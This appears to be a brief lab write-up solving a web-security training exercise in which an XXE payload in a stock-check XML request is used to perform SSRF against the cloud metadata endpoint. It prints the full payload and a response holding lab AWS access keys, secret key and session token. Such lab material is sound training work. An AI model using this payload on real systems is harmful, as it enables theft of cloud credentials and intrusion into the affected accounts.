# Lab: Exploiting XXE to perform SSRF attacks

Get a product page and hit the stock check, intercepting the request. Send it to the repeater and modify the XML to be:
```
<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
        <stockCheck>
            <productId>
                &xxe;
            </productId>
            <storeId>
                1
            </storeId>
        </stockCheck>
```

This returns an error message "Invalid product ID: admin"

Change the url to be `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin` and send the request again. This returns:

```
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2022-02-18T01:44:26.768358149Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "JFQlsCDJ2S3A39jBBC8K",
  "SecretAccessKey" : "icaCpebDUOmYlFXqbos4uSD0w2kOrLKCFR0anHBd",
  "Token" : "BTdQxostxhb9o6evXQAHJZynSJzVqKrp12i7qajIspcU6UdOdkfpfbPhYoQo9zHGAuJx3QhqVjoGcP4T4abHXymZx4q52wTalaA5UMrmuNK0SSIKWJomawd7xptHIquPBlBRBG97aCVMVyIh8LhbD3Wz40cragpHPPl81xCHyn6rq4HePAJrd0HOpJJwOelK8QXdrPSgCiri0ruAXAwL5APcoqkU87YWYUKUKXBkzaP3aoEcGA3Z2vhbXEWmwDZz",
  "Expiration" : "2028-02-17T01:44:26.768358149Z"
}"
```

Lab solved.